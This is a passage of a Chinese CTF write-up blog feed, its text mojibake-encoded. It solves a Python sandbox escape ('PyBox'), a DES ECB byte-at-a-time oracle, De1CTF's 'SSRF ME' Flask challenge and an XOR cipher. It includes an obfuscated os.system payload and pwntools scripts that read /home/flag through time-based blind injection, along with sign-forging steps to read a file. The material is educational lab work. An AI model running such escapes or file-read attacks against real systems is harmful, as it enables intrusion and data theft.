class="string">'__clo'</span>+<span class="string">'sure__'</span>)<span class="selector-attr">[0]</span><span class="selector-class">.cell_contents</span>(<span class="string">'o'</span>+<span class="string">'s'</span>)<span class="selector-class">.__getattribute__</span>(<span class="string">'sy'</span>+<span class="string">'stem'</span>)(<span class="string">'l'</span>+<span class="string">'s home'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/MUOSVZzu9Qqt4fX.png" alt="PyBoxV"></p><p>æ²¡æœ‰æŠ¥é”™ï¼Œ</p><p>ä½†æ˜¯è¿™é‡Œæ²¡æœ‰å›æ˜¾å‘ƒï¼Œäºæ˜¯ï¼Œæ—¶é—´ç›²æ³¨ç»“åˆclosureï¼Œ</p><p>å†æ ¹æ®è¿™ç¯‡æ–‡ç« <a href="https://blog.csdn.net/caoshunxin01/article/details/79355566" target="_blank" rel="noopener">https://blog.csdn.net/caoshunxin01/article/details/79355566</a></p><p>åˆ©ç”¨cut - c é€ä½çˆ†ç ´</p><p>payload:</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span><span class="selector-class">.__getattribute__</span>(<span class="string">'__clo'</span>+<span class="string">'sure__'</span>)<span class="selector-attr">[0]</span><span class="selector-class">.cell_contents</span>(<span class="string">'o'</span>+<span class="string">'s'</span>)<span class="selector-class">.__getattribute__</span>(<span class="string">'sy'</span>+<span class="string">'stem'</span>)(<span class="string">'flag_p=`cut -c 1 /home/flag`; [ $flag_p = \"f\" ] &amp;&amp; sleep 2'</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"47.112.108.17"</span>,<span class="number">12312</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans = <span class="string">"__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('a=`cut -c 1 /home/flag`; [ $a = \"</span>f\<span class="string">" ] &amp;&amp; sleep 1'"</span></span><br><span class="line">t = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">sh.sendline(ans)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>()-t &gt; <span class="number">0.5</span> :</span><br><span class="line">print(<span class="string">"get!"</span>)</span><br><span class="line">break</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å›æ˜¾</p><p><img src="https://i.loli.net/2020/04/30/UkcE5Dw72Roafty.png" alt="PyBox"></p><p>åˆ©ç”¨æˆåŠŸã€‚å†åŠ ä¸¤ä¸ªå¾ªç¯ï¼Œå°±å¥½äº†ã€‚</p><p>å¾—åˆ°ç»“æœ</p><p><img src="https://i.loli.net/2020/04/30/AHvZk86rQUMOYh3.png" alt="PyBox"></p><p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯åæ¥æ”¹flagäº†ï¼Œä¹‹å‰è·‘è„šæœ¬å¾—åˆ°çš„æ˜¯</p><p>flag{Pyt5on_S4ndB0x+4pParmOr_S4ndb0x}</p><p>å†™wpå¤ç°çš„æ—¶å€™å¾—åˆ°çš„æ˜¯</p><p>flag{Pyt5on_S4ndB0x+4pParmOr_S4ndb0x_sorry}  </p><p>hhhh?</p><h3 id="Babycry"><a href="#Babycry" class="headerlink" title="Babycry"></a>Babycry</h3><p>nc è¿‡å»å¾—åˆ°åŠ å¯†è§„åˆ™</p><p><img src="https://i.loli.net/2020/04/30/VQmAefY47rS928R.png" alt="Babycry"></p><p>å†™wpçš„æ—¶å€™ç¯å¢ƒå…³äº†ï¼Œè¿™é‡Œå°±ç›´æ¥å£è¿°äº†ã€‚</p><p>æ—¢ç„¶åŠ å¯†è§„åˆ™æ˜¯desï¼ˆkey,sth..flag{*}paddingï¼‰</p><p>åŠ ä¸Šhint</p><p>æ‰€ä»¥æˆ‘ä»¬æ§åˆ¶è¾“å…¥ï¼Œå¯ä»¥ä½¿å¾—è¢«åŠ å¯†çš„å­—ç¬¦æœ«å°¾ä¸º</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______ï¼ˆ<span class="number">7</span>ä¸ª<span class="keyword">_</span>ï¼‰</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬å…ˆè¾“å…¥</p><p>des a</p><p>des aa</p><p>des aaa</p><p>ç›´åˆ°æ‹¼æ¥åçš„å­—ç¬¦ä¸²é•¿åº¦ä¸º8çš„å€æ•°ï¼Œ</p><p>å°è±¡é‡Œåº”è¯¥æ˜¯ä¸¤ä¸ªaçš„æ—¶å€™ï¼Œå°±å¥½äº†ã€‚</p><p>ç„¶åæˆ‘ä»¬å½“è¾“å…¥ä¸‰ä¸ªaçš„æ—¶å€™ï¼Œå­—ç¬¦ä¸²åº”è¯¥å°±æ˜¯aaaflag{*}å†åŠ ä¸Šä¸ƒä¸ª_ï¼Œé‚£ä¹ˆæœ«å°¾å°±åº”è¯¥æ˜¯ä¸€ä¸ª}åŠ ä¸ƒä¸ª_ç»„æˆçš„ï¼Œ</p><p>å¯†æ–‡æœ«å°¾çš„8ä¸ªå­—èŠ‚ï¼Œå°±æ˜¯è¿™ä¸€ä¸ª}åŠ ä¸ƒä¸ª_å­—ç¬¦æ‰€ç»„æˆçš„å…«ä¸ªå­—ç¬¦çš„å¯†æ–‡</p><p>æˆ‘ä»¬å¯ä»¥è¾“å…¥</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______ï¼ˆ<span class="number">7</span>ä¸ª<span class="keyword">_</span>ï¼‰</span><br></pre></td></tr></table></figure><p>çœ‹è¿”å›çš„å¯†æ–‡çš„å‰8ä¸ªå­—èŠ‚åŠ ä¸€éªŒè¯ã€‚</p><p>äºæ˜¯æ€è·¯å°±æ˜¯ï¼Œæ§åˆ¶paddingï¼Œé€ä½çˆ†ç ´ï¼Œ</p><p>è¾“å…¥aaaaï¼Œè¿”å›å¯†æ–‡çš„å8å­—èŠ‚å°±æ˜¯æ˜æ–‡    </p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&#125;______ï¼ˆ<span class="number">6</span>ä¸ª<span class="literal">_</span>ï¼‰<span class="meta">#?ä»£è¡¨flagæœ€åä¸€ä½å­—ç¬¦</span></span><br></pre></td></tr></table></figure><p>çš„å¯†æ–‡</p><p>ç„¶åæˆ‘ä»¬åœ¨çˆ†ç ´è¿™ä¸€ä½ï¼Œç›´åˆ°è¿”å›å¯†æ–‡çš„å‰å…«ä¸ªå­—èŠ‚ä¸è¾“å…¥aaaaè¿”å›çš„å¯†æ–‡çš„æœ€å8å­—èŠ‚ç›¸åŒä½ç½®ï¼Œ</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"139.9.222.76"</span>,19999)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(33,126):</span><br><span class="line">    ans = <span class="string">"des "</span>+chr(i)+<span class="string">"&#125;______"</span></span><br><span class="line">    <span class="keyword">sh</span>.sendline(ans)</span><br><span class="line">    p = <span class="keyword">sh</span>.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"54f6d4254fe2a8d4"</span> <span class="keyword">in</span> p :</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"get!"</span>)</span><br><span class="line">        <span class="keyword">print</span>(ans)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœ</p><p><img src="https://i.loli.net/2020/04/30/UYbicRHzJ5n2gEu.png" alt="Babycry"></p><p>ç„¶åä»¥æ­¤ç±»æ¨ï¼Œé€ä½çˆ†ç ´ã€‚</p><p>åé¢è¿˜æœ‰ç‚¹åŒºåˆ«å°±æ˜¯ï¼Œçˆ†ç ´å®Œ8ä½ï¼Œç”¨æ¥éªŒè¯çš„å¯†æ–‡ä¸èƒ½å†ä»æœ«å°¾æ‰¾äº†ï¼Œå¾—æ‰¾ä¹‹å‰æ‰¾çš„8ä¸ªå­—èŠ‚å¯†æ–‡çš„å‰8ä¸ªå­—èŠ‚å¯†æ–‡ã€‚</p><p>æ¯”èµ›çš„æ—¶å€™å°±æ˜¯ç”¨è¿™ä¸ªåŠè‡ªåŠ¨åŒ–è„šæœ¬æ‰‹æ’¸çš„ï¼Œ</p><p>åŸæœ¬æƒ³åœ¨å†™wpçš„æ—¶å€™å†™ä¸ªå…¨è‡ªåŠ¨åŒ–çš„ï¼Œå¥ˆä½•ç¯å¢ƒå…³äº†ï¼Œæ²¡æ³•æµ‹è¯•ã€‚é‚æ”¾å¼ƒã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 De1CTF</title>
      <link href="/2019/08/03/2019De1CTF/"/>
      <url>/2019/08/03/2019De1CTF/</url>
      
        <content type="html"><![CDATA[<h3 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h3><p>hintï¼šflag is in ./flag.txt</p><p>è®¿é—®é¶æœºï¼Œæ‹¿åˆ°é¢˜ç›®æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>å›æ˜¾flagçš„åœ°æ–¹åº”è¯¥æ˜¯Execå‡½æ•°ï¼Œç„¶åè¦å…ˆè¿‡ä¸€ä¸ªåˆ¤æ–­self.checkSign()</p><p>å®šä½åˆ°checkSignå‡½æ•°åˆæ˜¯ä¸€ä¸ªåˆ¤æ–­ if(getSign(self.action, self.param) == self.sign)</p><p>åœ¨å®šä½åˆ°getSignå‡½æ•°  return hashlib.md5(secert_key + param + action).hexdigest()</p><p>è¿™é‡Œä¼šæŠŠkeyï¼Œparamï¼Œactionä¸²èµ·æ¥ç„¶åmd5åŠ å¯†ï¼Œself.signæ˜¯cookieé‡Œçš„ï¼Œè¿™ä¸ªå¯ä»¥é€ ï¼Œå†è¯´ï¼Œç„¶åæ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>è¦æ±‚scanåœ¨actioné‡Œé¢ï¼Œè¿™æ ·å­ä»–ä¼šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨scanä¸€ä¸ª{$param}æ–‡ä»¶ï¼Œå®šä½åˆ°scanå‡½æ•°ï¼Œ</p><p>return urllib.urlopen(param).read()[:50]ï¼Œä»–ä¼šæ‰“å¼€ä¸€ä¸ª{$param}æ–‡ä»¶å¹¶ä¸”åªå–å‰50ä½ï¼Œæ‰€ä»¥å°±æ‰“å¼€flag.txtå’¯ï¼Œ</p><p>patam=flag.txtï¼Œç„¶åä»–ä¼šæŠŠflag.txtçš„å†…å®¹å†™è¿›é‚£ä¸ªresultæ–‡ä»¶ã€‚æ¥ç€å¦‚æœreadåœ¨actioné‡Œé¢ï¼Œä»–å°±ä¼šæ‰“å¼€resultæ–‡ä»¶ï¼Œå¹¶æŠŠå†…å®¹èµ‹å€¼ç»™resultï¼Œç„¶åè¾“å‡ºï¼ˆå°±æ˜¯ç»™ä½ çœ‹å•¦ï¼‰ã€‚</p><p>é‚£ä¹ˆç›®çš„æ˜ç¡®äº†ï¼Œå¾€å‰æ¨å°±æ˜¯ï¼Œaction=readscanï¼Œç„¶åparam=flag.txtï¼Œé‚£ä¹ˆä¸ºäº†è¿‡æ£€æŸ¥ï¼Œsign=MD5(flag.txtreadscan)ï¼Œæ€ä¹ˆè·å¾—è¿™ä¸ªå‘¢ï¼Œæœ‰getsignè¿™ä¸ªå‡½æ•°ã€‚æ€ä¹ˆå›æ˜¾signå‘¢ï¼Ÿæœ‰geneSign()è¿™ä¸ªå‡½æ•°ï¼ŒgeneSignè¿™ä¸ªå‡½æ•°é‡Œçš„actionèµ‹å€¼ä¸ºscanäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©param=flag.txtrreadï¼Œå°±å¯ä»¥è·å¾—MD5(flag.txtreadscan)äº†ã€‚okayï¼Œä¸‡äº‹ä¿±å¤‡ã€‚é‚£æ€ä¹ˆæ‰§è¡Œåˆ°Exec()å‡½æ•°å‘¢ï¼Œåœ¨/De1taé‡Œçš„challenge()å‡½æ•°ï¼Œparamå¯ä»¥getã€‚actionå’Œsignéƒ½æ˜¯cookieé‡Œçš„ã€‚</p><p>æ‰€ä»¥æ€»çš„æ­¥éª¤ï¼š</p><ol><li>è®¿é—®/geneSign?param=flag.txtread                                  å¾—åˆ°$sign</li><li>è®¿é—®/De1ta?param=flag.txt                                                æŠ“åŒ…ï¼Œå†™å…¥sign=$signå’Œaction=readscan</li></ol><p>get flagã€‚</p><h3 id="XORZ"><a href="#XORZ" class="headerlink" title="XORZ"></a>XORZ</h3><p>åŠ å¯†æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"></span><br><span class="line">key=flag.strip(<span class="string">"de1ctf&#123;"</span>).strip(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(key&lt;<span class="number">38</span>))</span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">''</span>.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="keyword">print</span> cipher</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure><p>è§£é¢˜æ€è·¯:</p><p>åŠ å¯†è„šæœ¬æ˜¯salt^key^plain=output</p><p>æ‰€ä»¥é€†è¿‡æ¥ï¼Œsalt^output=key^plain</p><p>å·²çŸ¥len(key)&lt;38ï¼Œ</p><p>æ‰€ä»¥å…ˆçˆ†ç ´é•¿åº¦ï¼Œ</p><p>åªè¦å¤‡é€‰çš„keyä¸æ˜¯ç©ºé›†å³å¯ï¼Œ</p><p>å¾—åˆ°å¯èƒ½çš„é•¿åº¦åªæœ‰30</p><p>ç„¶åå°±å¯ä»¥åˆ—å‡ºkeyçš„æ¯ä¸€ä½çš„å¯èƒ½å€¼</p><p>å…ˆéšä¾¿é€‰ä¸€ç»„keyå¼‚æˆ–ï¼Œç„¶åå¾—åˆ°åŸæ–‡æ˜¯èç¿14è¡Œè¯—</p><p>æ ¹æ®åŸæ–‡è°ƒæ•´keyå³å¯ã€‚</p><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 